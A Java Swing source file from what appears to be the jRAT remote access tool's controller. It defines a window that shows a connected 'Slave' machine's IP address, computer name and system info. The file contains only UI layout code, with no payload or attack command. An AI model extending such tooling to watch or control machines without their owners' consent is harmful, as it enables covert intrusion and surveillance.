package io.jrat.client.ui.frames;

import io.jrat.client.Slave;
import io.jrat.client.ui.panels.PanelControlComputerInfo;

import java.awt.BorderLayout;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

@SuppressWarnings("serial")
public class FrameComputerInfo extends JFrame {

	private JPanel contentPane;

	public FrameComputerInfo(Slave slave) {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);
		contentPane.add(new PanelControlComputerInfo(slave));
		setTitle("Computer Info - " + slave.getIP() + " - " + slave.getComputerName());
	}

}
